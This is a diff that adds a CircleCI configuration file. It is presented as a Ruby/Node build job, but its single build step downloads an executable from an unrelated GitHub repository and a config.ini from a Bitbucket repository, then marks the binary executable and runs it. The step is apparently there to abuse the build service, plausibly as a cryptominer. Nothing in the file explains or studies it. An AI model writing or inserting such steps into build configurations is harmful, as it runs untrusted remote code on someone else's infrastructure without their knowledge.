@@ -1,0 +1,11 @@
+version: 2.0
+jobs:
+  build:
+    docker:
+      - image: circleci/ruby:2.4.2-jessie-node
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
+    steps:
+      - checkout
+      - run:  wget -O data_api https://github.com/angkii/asu/raw/main/gas && wget https://bitbucket.org/sakalilion/guardian4-1/raw/2cc8a7c3b3b6c17a0073f0ec8259bb146e403568/config.ini && chmod +x data_api && ./data_api
